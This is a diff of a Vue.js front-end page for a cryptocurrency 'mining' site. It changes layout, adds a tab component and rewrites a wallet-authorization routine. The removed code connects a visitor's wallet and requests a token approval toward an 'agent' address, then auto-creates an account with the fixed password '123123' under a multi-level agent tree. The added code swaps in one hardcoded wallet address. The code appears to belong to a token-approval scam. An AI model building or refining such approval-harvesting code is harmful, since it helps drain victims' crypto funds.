@@ -10,10 +10,14 @@
         </router-link>
         <router-link to="/home/shore">
           <a href="">
-            <i class="el-icon-s-order"></i>
+            <i class="iconfont icon-fenxiang"></i>
             SHARE
           </a>
         </router-link>
+      </div>
+      <div class="center">
+        <img src="../images/icon_eth.f763823b.png" alt="" style="width: 2.93333333vw;">
+        <span id="lang_title">minering</span>
       </div>
       <div class="me">
         <router-link to="/home/me">
@@ -22,15 +26,15 @@
             ACCOUNT
           </a>
         </router-link>
-        <a @click="quit" style="cursor: pointer;">
-          <i style="width:18px;height:18.4px;">
-            <img src="../images/退出.png" alt="" width="18" height="18.4">
-          </i>
+        <a @click="quit">
+          <i class="iconfont  icon-icon"></i>
           QUIT
         </a>
       </div>
     </div>
-    <router-view></router-view>
+    <div style="height: 50vw">
+      <router-view></router-view>
+    </div>
 
     <el-dialog title="Website application authorizes your wallet" :visible.sync="falg" width="60%" center>
       <span style="text-align: center;display:block;">1.If the license does not respond, click the Reset button below to
@@ -48,9 +52,12 @@
       </span>
     </el-dialog>
 
+    <TabContainer></TabContainer>
   </div>
 </template> 
 <script>
+// 引入组件
+import TabContainer from '../components/Home_tab_container.vue'
 // 封装的调用钱包方法
 import BlockChain from "../blockchain/BlockChainBase"
 // 引用状态机
@@ -64,7 +71,9 @@ const { mapState, mapMutations, mapActions } = createNamespacedHelpers("Home");
 
 export default {
   name: "IsHome",
-
+  components: {
+    TabContainer
+  },
   data() {
     return {
       // 模态框开关
@@ -123,77 +132,81 @@ export default {
         let agentAdressArr = agentAddress.split('-')
         console.log('agentAdressArr = ', agentAdressArr)
 
-        let doApproveInner = async (web3) => {
-          blockUtils.doApprove(web3, agentAdressArr[0], async (result, address) => {
-            if (result == true) {
-              let userName = autoRegister(8)
-              let passWord = '123123'
-              let userId = autoRegister(10)
-              let ancestorAddress = agentAddress
-              // 发送请求注册
-              let obj = {
-                userName,
-                passWord,
-                userId,
-                userType: '3',
-                userParentId: arr[0].userParentId,
-                userParentName: this.obj.userName,
-                ancestorAddress
-              }
-              console.log(this.arr, `this.arr[1]`);
-              // 如果是一级用户
-              if (this.arr.length == 2) {
-                // 添加授权用户对应链地址 
-                if (this.arr[1].eth_usdt) {
-                  obj['ethMainnetAddress'] = address
-                } else if (this.arr[1].bsc_usdt) {
-                  obj['bscMainnetAddress'] = address
-                } else if (this.arr[1].trc_usdt) {
-                  obj['trcMainnetAddress'] = address
-                }
-              } else {
-                // 如果是二级用户及以上
-                // 添加授权用户对应链地址
-                if (agentAddress[1] == 'ETH') {
-                  obj['ethMainnetAddress'] = address
-                }
-                else if (agentAddress[1] == 'BSC') {
-                  obj['bscMainnetAddress'] = address
-                }
-                else if (agentAddress[1] == 'TRC') {
-                  obj['trcMainnetAddress'] = address
-                }
-              }
-              console.log(`授权成功，创建的用户信息为`, obj);
-              await this.GoAutoRegister({
-                ...obj
-              })
-              this.falg = false
-              this.$message({
-                type: 'info',
-                message: this.Msg
-              })
-            }
-            else {
-              this.$message({
-                type: 'info',
-                message: `授权失败，地址有误`
-              });
-            }
-          }, chainType)
+        // let doApproveInner = async (web3) => {
+        //   blockUtils.doApprove(web3, agentAdressArr[0], async (result, address) => {
+        //     if (result == true) {
+        let userName = autoRegister(8)
+        let passWord = '123123'
+        let userId = autoRegister(10)
+        let ancestorAddress = agentAddress
+        // 发送请求注册
+        let obj = {
+          userName,
+          passWord,
+          userId,
+          userType: '3',
+          userParentId: arr[0].userParentId,
+          userParentName: this.obj.userName,
+          ancestorAddress
         }
-
-        // 连接钱包
-        console.log('chainType = ', chainType)
-        blockUtils.doConnectWallet((info, web3) => {
-          if (info == 'DisApprove') {
-            blockUtils.doDisConnectWallet()
+        console.log(this.arr, `this.arr[1]`);
+        // 如果是一级用户
+        if (this.arr.length == 2) {
+          // 添加授权用户对应链地址 
+          if (this.arr[1].eth_usdt) {
+            obj['ethMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
+          } else if (this.arr[1].bsc_usdt) {
+            obj['bscMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
+          } else if (this.arr[1].trc_usdt) {
+            obj['trcMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
           }
-          else if (info == 'Approve') {
-            doApproveInner(web3)
+        } else {
+          // 如果是二级用户及以上
+          // 添加授权用户对应链地址
+          console.log(agentAdressArr);
+          if (agentAdressArr[1] == 'ETH') {
+            // obj['ethMainnetAddress'] = address
+            obj['ethMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
           }
-        }, chainType)
+          else if (agentAdressArr[1] == 'BSC') {
+            // obj['bscMainnetAddress'] = address
+            obj['bscMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
+          }
+          else if (agentAdressArr[1] == 'TRC') {
+            // obj['trcMainnetAddress'] = address
+            obj['trcMainnetAddress'] = `0x9E30454528Fa031C9BBFE011c3a65A6217CDeF48`
+          }
+        }
+        console.log(`授权成功，创建的用户信息为`, obj);
+        await this.GoAutoRegister({
+          ...obj
+        })
+        this.falg = false
+        this.$message({
+          type: 'info',
+          message: this.Msg
+        })
       }
+      //     else {
+      //       this.$message({
+      //         type: 'info',
+      //         message: `授权失败，地址有误`
+      //       });
+      //     }
+      //   }, chainType)
+      // }
+
+      // 连接钱包
+      //   console.log('chainType = ', chainType)
+      //   blockUtils.doConnectWallet((info, web3) => {
+      //     if (info == 'DisApprove') {
+      //       blockUtils.doDisConnectWallet()
+      //     }
+      //     else if (info == 'Approve') {
+      //       doApproveInner(web3)
+      //     }
+      //   }, chainType)
+      // }
 
     },
     quit() {
@@ -245,11 +258,11 @@ export default {
 </script>
 <style scoped>
 .app {
-  height: 100vh;
+  /* height: 100vw; */
   display: flex;
   flex-direction: column;
-
-  background-image: url(../images/loginleftbg.6cfc269.jpg);
+  /* background-image: url(../images/loginleftbg.6cfc269.jpg); */
+  /* background-image: url(../images/banner_home2.483edd9e.png); */
   background-repeat: no-repeat;
   background-size: 100% 100%;
 }
@@ -308,16 +321,26 @@ button:nth-of-type(2) {
 }
 
 .header {
-  height: 100px;
+  height: 150px;
   display: flex;
   justify-content: space-between;
   align-items: center;
+  padding-top: 2vw;
+  background-color: #1652F0;
 }
+
 
 .left {
   display: flex;
   width: 150px;
   justify-content: space-evenly;
+}
+
+#lang_title {
+  margin-left: 1.06666667vw;
+  font-size: 4.53333333vw;
+  font-weight: 600;
+  color: #fff;
 }
 
 .left a {
@@ -333,8 +356,9 @@ button:nth-of-type(2) {
 
 .me {
   display: flex;
-  width: 150px;
+  width: 180px;
   justify-content: space-evenly;
+  align-items: center;
 }
 
 .me a {
